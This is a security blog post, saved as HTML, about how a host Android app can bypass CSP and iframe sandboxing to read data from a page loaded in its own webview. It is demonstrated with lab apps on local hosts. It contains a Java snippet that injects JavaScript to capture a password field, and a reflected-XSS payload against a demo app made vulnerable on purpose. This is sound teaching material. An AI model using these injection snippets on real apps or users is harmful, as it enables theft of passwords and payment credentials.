<!DOCTYPE html>
<html âš¡>
<head>
    <meta charset="utf-8">

    <title>Android Webview Exploited</title>

    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">

    <link rel="shortcut icon" href="../../favicon.ico" type="image/x-icon" />
    <link rel="canonical" href="../index.html" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    
    <meta property="og:site_name" content="nuckingfoob" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="Android Webview Exploited" />
    <meta property="og:description" content="How an android app can bypass CSP, iframe sandbox attributes, etc. to compromise the page getting loaded in the webview despite the classic protections in place." />
    <meta property="og:url" content="http://localhost:2368/android-webview-csp-iframe-sandbox-bypass/" />
    <meta property="article:published_time" content="2020-03-24T07:23:33.000Z" />
    <meta property="article:modified_time" content="2020-04-02T14:40:58.000Z" />
    <meta property="article:tag" content="BackToBasics" />
    <meta property="article:tag" content="LeftBrain" />
    
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="Android Webview Exploited" />
    <meta name="twitter:description" content="How an android app can bypass CSP, iframe sandbox attributes, etc. to compromise the page getting loaded in the webview despite the classic protections in place." />
    <meta name="twitter:url" content="http://localhost:2368/android-webview-csp-iframe-sandbox-bypass/" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="qreoct" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="BackToBasics, LeftBrain" />
    <meta name="twitter:site" content="@geek_ji" />
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "nuckingfoob",
        "logo": {
            "@type": "ImageObject",
            "url": "http://localhost:2368/favicon.ico",
            "width": 48,
            "height": 48
        }
    },
    "author": {
        "@type": "Person",
        "name": "qreoct",
        "url": "http://localhost:2368/author/qreoct/",
        "sameAs": []
    },
    "headline": "Android Webview Exploited",
    "url": "http://localhost:2368/android-webview-csp-iframe-sandbox-bypass/",
    "datePublished": "2020-03-24T07:23:33.000Z",
    "dateModified": "2020-04-02T14:40:58.000Z",
    "keywords": "BackToBasics, LeftBrain",
    "description": "How an android app can bypass CSP, iframe sandbox attributes, etc. to compromise the page getting loaded in the webview despite the classic protections in place.",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://localhost:2368/"
    }
}
    </script>

    <meta name="generator" content="Ghost 3.4" />
    <link rel="alternate" type="application/rss+xml" title="nuckingfoob" href="../../rss/index.html" />

    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,600,400" />
    <style amp-custom>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{margin:0.67em 0;font-size:2em}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{position:relative;vertical-align:baseline;font-size:75%;line-height:0}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}amp-img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace, monospace;font-size:1em}button,input,optgroup,select,textarea{margin:0;color:inherit;font:inherit}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{cursor:pointer;-webkit-appearance:button}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{margin:0 2px;padding:0.35em 0.625em 0.75em;border:1px solid #c0c0c0}legend{padding:0;border:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}html{max-height:100%;height:100%;font-size:62.5%;-webkit-tap-highlight-color:rgba(0, 0, 0, 0)}body{max-height:100%;height:100%;color:#3a4145;background:#f4f8fb;letter-spacing:0.01rem;font-family:"Merriweather", serif;font-size:1.8rem;line-height:1.75em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"kern" 1;-moz-font-feature-settings:"kern" 1;-o-font-feature-settings:"kern" 1}::-moz-selection{background:#d6edff}::selection{background:#d6edff}h1,h2,h3,h4,h5,h6{margin:0 0 0.3em 0;color:#2e2e2e;font-family:"Open Sans", sans-serif;line-height:1.15em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-moz-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-o-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1}h1{text-indent:-2px;letter-spacing:-1px;font-size:2.6rem}h2{letter-spacing:0;font-size:2.4rem}h3{letter-spacing:-0.6px;font-size:2.1rem}h4{font-size:1.9rem}h5{font-size:1.8rem}h6{font-size:1.8rem}a{color:#4a4a4a}a:hover{color:#111}p,ul,ol,dl{margin:0 0 2.5rem 0;font-size:1.5rem;text-rendering:geometricPrecision;-webkit-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-moz-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-o-font-feature-settings:"liga" 1, "onum" 1, "kern" 1}ol,ul{padding-left:2em}ol ol,ul ul,ul ol,ol ul{margin:0 0 0.4em 0;padding-left:2em}dl dt{float:left;clear:left;overflow:hidden;margin-bottom:1em;width:180px;text-align:right;text-overflow:ellipsis;white-space:nowrap;font-weight:700}dl dd{margin-bottom:1em;margin-left:200px}li{margin:0.4em 0}li li{margin:0}hr{display:block;margin:1.75em 0;padding:0;height:1px;border:0;border-top:#efefef 1px solid}blockquote{box-sizing:border-box;margin:1.75em 0 1.75em 0;padding:0 0 0 1.75em;border-left:#4a4a4a 0.4em solid;-moz-box-sizing:border-box}blockquote p{margin:0.8em 0;font-style:italic}blockquote small{display:inline-block;margin:0.8em 0 0.8em 1.5em;color:#ccc;font-size:0.9em}blockquote small:before{content:"\2014 \00A0"}blockquote cite{font-weight:700}blockquote cite a{font-weight:normal}mark{background-color:#fdffb6}code,tt{padding:1px 3px;border:#e3edf3 1px solid;background:#f7fafb;border-radius:2px;white-space:pre-wrap;font-family:Inconsolata, monospace, sans-serif;font-size:0.85em;font-feature-settings:"liga" 0;-webkit-font-feature-settings:"liga" 0;-moz-font-feature-settings:"liga" 0}pre{overflow:auto;box-sizing:border-box;margin:0 0 1.75em 0;padding:10px;width:100%;border:#e3edf3 1px solid;background:#f7fafb;border-radius:3px;white-space:pre;font-family:Inconsolata, monospace, sans-serif;font-size:0.9em;-moz-box-sizing:border-box}pre code,pre tt{padding:0;border:none;background:transparent;white-space:pre-wrap;font-size:inherit}kbd{display:inline-block;margin-bottom:0.4em;padding:1px 8px;border:#ccc 1px solid;background:#f4f4f4;border-radius:4px;box-shadow:0 1px 0 rgba(0, 0, 0, 0.2), 0 1px 0 0 #fff inset;color:#666;text-shadow:#fff 0 1px 0;font-size:0.9em;font-weight:700}table{box-sizing:border-box;margin:1.75em 0;max-width:100%;width:100%;background-color:transparent;-moz-box-sizing:border-box}table th,table td{padding:8px;border-top:#efefef 1px solid;vertical-align:top;text-align:left;line-height:20px}table th{color:#000}table caption + thead tr:first-child th,table caption + thead tr:first-child td,table colgroup + thead tr:first-child th,table colgroup + thead tr:first-child td,table thead:first-child tr:first-child th,table thead:first-child tr:first-child td{border-top:0}table tbody + tbody{border-top:#efefef 2px solid}table table table{background-color:#fff}table tbody > tr:nth-child(odd) > td,table tbody > tr:nth-child(odd) > th{background-color:#f6f6f6}table.plain tbody > tr:nth-child(odd) > td,table.plain tbody > tr:nth-child(odd) > th{background:transparent}iframe,amp-iframe,.fluid-width-video-wrapper{display:block;margin:1.75em 0}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper amp-iframe{margin:0}textarea,select,input{margin:0 0 5px 0;padding:6px 9px;width:260px;outline:0;border:#e7eef2 1px solid;background:#fff;border-radius:4px;box-shadow:none;font-family:"Open Sans", sans-serif;font-size:1.6rem;line-height:1.4em;font-weight:100;-webkit-appearance:none}textarea{min-width:250px;min-height:80px;max-width:340px;width:100%;height:auto}input[type="text"]:focus,input[type="email"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="number"]:focus,input[type="date"]:focus,input[type="month"]:focus,input[type="week"]:focus,input[type="time"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,textarea:focus{outline:none;outline-width:0;border:#bbc7cc 1px solid;background:#fff}select{width:270px;height:30px;line-height:30px}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}.clearfix{zoom:1}.main-header{position:relative;display:table;overflow:hidden;box-sizing:border-box;width:100%;height:50px;background:#5ba4e5 no-repeat center center;background-size:cover;text-align:left;-webkit-box-sizing:border-box;-moz-box-sizing:border-box}.content{background:#fff;padding-top:15px}.blog-title,.content{margin:auto;max-width:600px}.blog-title a{display:block;padding-right:16px;padding-left:16px;height:50px;color:#fff;text-decoration:none;font-family:"Open Sans", sans-serif;font-size:16px;line-height:50px;font-weight:600}.post{position:relative;margin-top:0;margin-right:16px;margin-left:16px;padding-bottom:0;max-width:100%;border-bottom:#ebf2f6 1px solid;word-wrap:break-word;font-size:0.95em;line-height:1.65em}.post-header{margin-bottom:1rem}.post-title{margin-bottom:0}.post-title a{text-decoration:none}.post-meta{display:block;margin:3px 0 0 0;color:#9eabb3;font-family:"Open Sans", sans-serif;font-size:1.3rem;line-height:2.2rem}.post-meta a{color:#9eabb3;text-decoration:none}.post-meta a:hover{text-decoration:underline}.post-meta .author{margin:0;font-size:1.3rem;line-height:1.3em}.post-date{display:inline-block;text-transform:uppercase;white-space:nowrap;font-size:1.2rem;line-height:1.2em}.post-image{margin:0;padding-top:3rem;padding-bottom:30px;border-top:1px #E8E8E8 solid}.post-content amp-img,.post-content amp-anim{position:relative;left:50%;display:block;padding:0;min-width:0;max-width:112%;width:calc(100% + 32px);height:auto;transform:translateX(-50%);-webkit-transform:translateX(-50%);-ms-transform:translateX(-50%)}.footnotes{font-size:1.3rem;line-height:1.6em;font-style:italic}.footnotes li{margin:0.6rem 0}.footnotes p{margin:0}.footnotes p a:last-child{text-decoration:none}.site-footer{position:relative;margin:0 auto 20px auto;padding:1rem 15px;max-width:600px;color:rgba(0,0,0,0.5);font-family:"Open Sans", sans-serif;font-size:1.1rem;line-height:1.75em}.site-footer a{color:rgba(0,0,0,0.5);text-decoration:none;font-weight:bold}.site-footer a:hover{border-bottom:#bbc7cc 1px solid}.poweredby{display:block;float:right;width:45%;text-align:right}.copyright{display:block;float:left;width:45%}</style>

    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
    <script async src="https://cdn.ampproject.org/v0.js"></script>

    

</head>

<body class="amp-template">
    <header class="main-header">
        <nav class="blog-title">
            <a href="../../index.html">nuckingfoob</a>
        </nav>
    </header>

    <main class="content" role="main">
        <article class="post">

            <header class="post-header">
                <h1 class="post-title">Android Webview Exploited</h1>
                <section class="post-meta">
                    <p class="author">by <a href="../../author/qreoct/index.html">qreoct</a></p>
                    <time class="post-date" datetime="2020-03-24">2020-03-24</time>
                </section>
            </header>
            <section class="post-content">

                <p>There are plenty of articles explaining the security issues with <a href="https://developer.android.com/guide/webapps/webview">android webview</a>, like <a href="https://proandroiddev.com/android-webviews-1cbe1ffb7a2b">this article</a> &amp; <a href="https://resources.infosecinstitute.com/android-hacking-security-part-7-attacks-android-webviews/#gref">this one</a>. Many of these resources talk about the risks that an untrusted page, loaded inside a webview, poses to the underlying app. The threats become more prominent especially when <a href="https://developer.android.com/guide/webapps/webview#EnablingJavaScript"><em>javascript</em> Â and/or the <em>javascript interface</em></a> is enabled on the webview. </p><p>In short, having <em>javascript enabled</em> &amp; not properly fortified allows for execution of arbitrary javascript in the context of the loaded page, making it quite similar to any other page that may be vulnerable to an XSS. And again, very simply put, having the <em>javascript interface enabled</em> allows for potential code execution in the context of the underlying android app. </p><p>In most of the cases, from whatever I came across, the situation was:</p><p><strong>Victim</strong>: The underlying android app inside whose webview a page would open either from it's own domain or from an external source/domain.</p><p><strong>Attacker</strong>: The attacker was the entity external to the app. Like an actor exploiting a potential XSS on the page loaded from the app's domain. Or the third party domain, from where the page is being loaded inside the webview, itself acting malicious.</p><p><strong>Attack vector</strong>: The vulnerable/malicious page loaded in the the webview. (through the abuse of the insecure implementations of some APIs)</p><p>This blog describes a situation wherein the tables stood turned. </p><blockquote>This time the victim was not the underlying app, but the page itself that was being loaded in the webview. The attacker was the the underlying android app, in whose webview the page was being loaded. The attack vector still remained the same as highlighted above. </blockquote><h3 id="the-story-line">The story line</h3><p>A certain product needs to integrate with a <em>huge </em>business. Let us call this <em>huge </em>business as <code><strong>BullyGiant</strong></code> &amp; the certain product as <code><strong>AppAwesome</strong></code> from this point on. Â </p><p>Many users have an account on both AppAwesome &amp; also on BullyGiant. The flow involves such users of BullyGiant to check out on their payments page with AppAwesome. Every transaction on AppAwesome requires to be authenticated &amp; authorized by the user by entering their password on the <em>AppAwesome's checkout page,</em> which appears before any transaction is allowed to go through. </p><p>AppAwesome cares about the security of it's customers. So it proposes the below security measures to anyone who wants to integrate with them, especially around AppAwesome's checkout page. </p><ol><li>Loading of the checkout page using AppAwesome's SDK. All of the page &amp; it's contents are sandboxed &amp; controlled by the SDK. This approach allows for maximum security &amp; the best user experience. </li><li>Loading of the checkout page on the underlying browser (or custom chrome tabs, if available). This approach again has quite decent security (limited by of course the underlying browser's security) but not a very good user experience. </li><li>Loading of the checkout page in the webview of the integrating app. This is comparatively the most insecure of the above proposals, although offers a better user experience than the second approach mentioned above.</li></ol><p>Now the deal is that AppAwesome is really very keen on securing their own customers' financial data &amp; hence very strongly recommends usage of their SDK. BullyGiant on the other hand, for some reason, (hopefully justified) does not really want to abide by the secure integration proposals by AppAwesome. AppAwesome does have a choice to deny any integration with BullyGiant. However, this integration is really crucial for AppAwesome to provide a superior user experience to it's own users &amp; <em>in fact even more crucial for AppAwesome to stay in the game. </em></p><p>So AppAwesome gives in &amp; agrees to integrate with BullyGiant succumbing to their terms of integration, i.e. using the least secure webview approach. The only things that protect AppAwesome's customers now is the <em>trust </em>that AppAwesome has on BullyGiant, which is somewhat also covered through the legal contracts between AppAwesome &amp; BullyGiant. That's all. </p><h2 id="technical-analysis-tl-dr-">Technical analysis (TL;DR)</h2><blockquote><em><strong>Thanks:</strong> <a href="https://twitter.com/bnchandrapal?s=20">Badshah</a> &amp; <a href="https://twitter.com/_AnoopSS?s=20">Anoop</a> for helping with the execution of the attack idea. Without your help, this blog post would not have been possible, at least not while it's still relevant :) </em></blockquote><p>Below is a tech analysis of why webview is a bad idea. It talks about how can a spurious (or compromised) app abuse webview features to extract sensitive data from the page loaded inside the webview, despite the many security mechanisms that the page, being loaded in the webview, might have implemented. We discuss in details, with <em>many</em> demos, how CSP, iframe sandbox etc. may be bypassed in android webview. Every single demo has a linked code base on my Github so they could be tried out first hand. Also, the below generic scheme is followed (not strictly in that order) throughout the blog:</p><ol><li> A simple demo of the underlying concepts on the browser &amp; android webview</li><li>Addition of security features to the underlying concepts &amp; then demo of the same on the browser &amp; android webview<br /> </li></ol><blockquote><strong>NB: </strong>Please ignore all other potential security issues that might be there with the code base/s</blockquote><h3 id="case-1-no-protection-mechanisms">Case 1: No protection mechanisms</h3><p><u>Apps used in this section:</u></p><ol><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla">AppAwesome</a></li><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla">BullyGiant</a></li></ol><p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla">AppAwesome</a> when accessed from a normal browser:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss3.png">

<figcaption>Vanilla AppAwesome Landing Page - Browser</figcaption>
</a>
</figure><p>And on submitting the above form:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss4.png">

<figcaption>Vanilla AppAwesome Checkout Page -Browser</figcaption>
</a>
</figure><p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla">AppAwesome</a> when accessed from <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla">BullyGiant</a> app:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/screen1-2.png">

<figcaption>Vanilla AppAwesome Page - Android Webview</figcaption>
</a>
</figure><p>Notice the <strong>Authenticate Payment</strong> web page is loaded inside a webview of the <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla">BullyGiant</a> app.</p><p>And on submitting the form above:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/scree2.png">

<figcaption>Vanilla AppAwesome Page - Android Webview</figcaption>
</a>
</figure><p>Notice that clicking on the <code>Submit</code> button also displays the content of the password field as a <code>toast message</code> on <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla">BullyGiant</a>. This proves how the underlying app may be able to sniff any data (sensitive or otherwise) from the page loaded in <strong>it's</strong> webview. </p><h3 id="under-the-bullygiant-hood">Under the <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla">BullyGiant</a> hood</h3><p>The juice of why BullyGiant was able to sniff password field out from the webview is because it is in total control of it's own webview &amp; hence can change the properties of the webview, listen to events etc. That is exactly what it is doing. It is </p><ol><li><a href="https://developer.android.com/guide/webapps/webview#EnablingJavaScript">enabling javascript</a> on it's webview &amp; </li><li>then it is listening for <a href="https://developer.android.com/reference/android/webkit/WebViewClient.html#onPageFinished(android.webkit.WebView,%20java.lang.String)">onPageFinished</a> event</li></ol><p>Snippet from <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla">BullyGiant</a>:</p><pre><code>    ...
    final WebView mywebview = (WebView) findViewById(R.id.webView);
    mywebview.clearCache(true);
    mywebview.loadUrl("http://192.168.1.38:31337/home");
    mywebview.getSettings().setJavaScriptEnabled(true);
    mywebview.setWebChromeClient(new WebChromeClient());
    mywebview.addJavascriptInterface(new AppJavaScriptProxy(this), "androidAppProxy");
    mywebview.setWebViewClient(new WebViewClient(){
        @Override
        public void onPageFinished(WebView view, String url) {...}
    ...</code></pre>
<p>Note that there is <code>addJavascriptInterface</code> as well. This is what many blogs (quoted in the beginning of this blog) talk about where the loaded web page can potentially be harmful to the underlying app. In our use case however, it is not of much consequence (from that perspective). All that it is used for is to show that BullyGiant could read the contents of the page loaded in the webview. It does so by sending the read content back to android (that's where the <code>addJavascriptInterface</code> Â is used) &amp; having it displayed as a toast message. </p><p>The other important bit in the BullyGiant code base is the over ridden <em>onPageFinished() </em>:</p><pre><code>    ...
    super.onPageFinished(view, url);
    mywebview.loadUrl("javascript:var button = document.getElementsByName(\"submit\")[0];button.addEventListener(\"click\", function(){ androidAppProxy.showMessage(\"Password : \" + document.getElementById(\"password\").value); return false; },false);");
    ...
</code></pre>
<p>That's where the javascript to read the password filed from the DOM is <em>injected </em>into the page loaded inside the webview.</p><h3 id="the-story-line-continued-">The story line continued...</h3><p>AppAwesome came about with the below solutions to prevent the web page from being read by the underlying app:</p><h3 id="suggestion-1-use-csp">Suggestion #1: Use CSP</h3><p>Use <code>CSP</code> to prevent BullyGiant from executing any javascript whatsoever inside the page loaded in the iframe</p><h3 id="suggestion-2-use-iframe-sandbox">Suggestion #2: Use Iframe Sandbox</h3><p>Load the sensitive page inside of an iframe on the main page in the webview. Use <code>iframe sandbox</code> to restrict any interactions between the parent window/page &amp; the iframe content. </p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a> is a mechanism to prevent execution of Â untrusted javascript inside a web page. While the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox">sandbox attribute of iframe</a> is a way to tighten the controls of the page within an iframe. It's very well explained in many resources like <a href="https://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/">here</a>. </p><p>With all the above restrictions imposed, our goal now would be to see if BullyGiant can still access the AppAwesome page loaded inside the webview or not. We would go about analyzing how each of the suggested solutions work in a normal browser &amp; in a webview &amp; how could BullyGiant access the loaded pages if at all. </p><h3 id="exploring-csp-with-inline-js">Exploring CSP With Inline JS</h3><p><u>Apps used in this section:</u></p><ol><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-inlineJS">AppAwesome</a></li><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla-inlineJS">BullyGiant</a></li></ol><p>Before moving on to the demo of CSP implementation &amp; it's effect/s on Android Webview, let's look at how a non-CSP page behaves in the normal (non-webview) browser &amp; a webview. </p><p>To demo this we have added an inline JS that would <em>alert 1 </em>on clicking of the submit button before proceeding to the success checkout page. <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-inlineJS">AppAwesome</a> code snippet:</p><pre><code>&lt;!DOCTYPE HTML&gt;
    ...
    &lt;script type="text/javascript"&gt;
      function f(){
        alert(1);
      }
    &lt;/script&gt;
    ...
      &lt;input type="submit" value="Submit" name="submit" name="submit" onclick="f();"&gt;
    ...
&lt;/html&gt;
</code></pre>
<p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-inlineJS">AppAwesome</a> when accessed from the browser &amp; when <em>Submit </em>button is clicked:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss7.png">

<figcaption>Vanilla AppAwesome Page - Inline JS =&gt; Firefox 74.0</figcaption>
</a>
</figure><p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-inlineJS">AppAwesome</a> when accessed from <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla-inlin">BullyGiant</a> app:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss8.png">

<figcaption>Vanilla AppAwesome Page - Inline JS =&gt; Android Webview</figcaption>
</a>
</figure><p>The above suggests that so far there is no change in how the page is treated by the 2 environments. Now let's check the change in behavior (if at all) when CSP headers are implemented. </p><h3 id="with-csp-implemented">With CSP Implemented</h3><p><u>Apps used in this section:</u></p><ol><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-CSP-inlineJS">AppAwesome</a></li><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla-inlineJS">BullyGiant</a></li></ol><h3 id="browser">Browser</h3><p>A quick demo of these features on a traditional browser (not webview) suggests that these controls are indeed useful (when implemented the right way) with what they are intended for.</p><p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-CSP-inlineJS">AppAwesome</a> when accessed from a browser:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss5.png">

<figcaption>CSP AppAwesome page - Inline JS =&gt; Firefox 74.0</figcaption>
</a>
</figure><p>Notice the <code>Content Security Policy</code> violations. These violations happen because of the CSP response headers, returned by the backend &amp; enforced by the browser.</p><p>Response headers from <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-CSP-inlineJS">AppAwesome</a>:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss6-1.png">

<figcaption>CSP AppAwesome page - Inline JS =&gt; Firefox 74.0</figcaption>
</a>
</figure><h3 id="android-webview">Android Webview</h3><p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-CSP-inlineJS">AppAwesome</a> when accessed from <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla-inlineJS">BullyGiant</a> gives the same <em>Authenticate Payment</em> page as above <em>&amp; the exact same CSP errors too</em>! This can be seen from the below screenshot of a remote debugging session taken from Chrome 80.0:</p><p>(<em>Firefox was not chosen for remote debugging because I was lazy to set up remote debugging on Firefox. Firefox set up on the AVD was required too :( as per <a>this</a> from the FF settings page. Also further down for all the demos we use adb logs instead of remote debugging sessions to show browser console messages</em>)</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss9.png">

<figcaption>On Google Chrome 80.0</figcaption>
</a>
</figure><p>Hence, we see that CSP does prevent execution of inline JS inside android webview, very much like a normal browser does. </p><h3 id="exploring-csp-with-injected-js">Exploring CSP With Injected JS</h3><p><u>Apps used in this section:</u></p><ol><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-injectedJS">AppAwesome</a> </li><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/withXSSAuditorDisabled">AppAwesome (with XSS-Auditor disabled)</a></li><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/BullyGiant-vanilla-injectedJS/">BullyGiant (without XSS payload)</a> </li><li><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/withXSSPayload">BullyGiant (with XSS payload)</a></li></ol><p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-injectedJS">AppAwesome</a> has been made deliberately vulnerable to a <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">reflected XSS</a> by adding a query parameter, <em>name</em>, to the home page. This param is vulnerable to reflected XSS. Also, all inline JS has been removed from this page to further emphasize on CSP's impact on injected JS.</p><p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-injectedJS">AppAwesome</a> when accessed from the browser while the <em>name</em> query parameter's value is <em>John Doe:</em></p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss10.png">

<figcaption>On Google Chrome 80.0</figcaption>
</a>
</figure><p>Now, for the sake of the demo, we would exploit the XSS vulnerable <em>name </em>query param to add an onclick event to the <em>Submit</em> button such that clicking it would alert "<em>injected 1"</em></p><p>XSS exploit payload</p><pre><code>&lt;body onload="f()"&gt;&lt;script type="text/javascript"&gt;function f(){var button=document.getElementsByName("submit")[0];button.addEventListener("click", function(){ alert("injected 1"); return false; },false);}&lt;/script&gt;
</code></pre>
<p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-injectedJS">AppAwesome</a> when accessed from the browser &amp; exploited with the above payload (in <em>name </em>query parameter):</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss11.png">

<figcaption>Vanilla AppAwesome Page - Exploited XSS =&gt; Firefox</figcaption>
</a>
</figure><p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-injectedJS">AppAwesome</a> when accessed from <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/withXSSPayload">BullyGiant</a>, without exploiting the XSS:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss12.png">

<figcaption>Vanilla AppAwesome Page - Vulnerable param =&gt; Android Webview</figcaption>
</a>
</figure><p><a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/AppAwesome-backend-vanilla-injectedJS">AppAwesome</a> when accessed from <a href="https://github.com/c0n71nu3/Android-Webview-Attack-Demo/tree/withXSSPayload">BullyGiant</a>, while attempting to exploit the XSS, produces the same screen as above, however, contrary to the script injection that was successful in case of a normal browser, this time clicking on the <em>Submit</em> button didn't really execute the payload at all. We were instead taken directly to the checkout page. Adb logs however did produce an interesting message as shown below:</p>
<figure class="kg-image-card">
<a href="../../content/images/2020/03/ss13.png">

<figcaption>Vanilla AppAwesome Page - Exploited XSS =&gt; Android Webview</figcaption>
</a>
</figure><p>The adb log messages is:</p><pre><code>03-27 12:29:33.672 26427-26427/com.example.webviewinjection I/chromium: [INFO:CONSOLE(9)] "The XSS Auditor refused to execute a script in 'http://192.168.1.35:31337/home?name=&lt;body onload="f()"&gt;&lt;script type="text/javascript"&gt;function f(){var button=document.getElementsByName("submit")[0];button.addEventListener("click", function(){ alert("injected 1"); return false; },false);}%3C/script%3E' because its source code was found within the request. The auditor was enabled as the server sent neither an 'X-XSS-Protection' nor 'Content-Security-Policy' header.", source: http://192.168.1.35:31337/home?name=&lt;body onload="f()"&gt;&lt;script type="text/javascript"&gt;function f(){var button=document.getElementsByName("submit")[0];button.addEventListener("click", function(){ alert("injected 1"); return false; },false);}%3C/script%3E (9)
</code></pre>
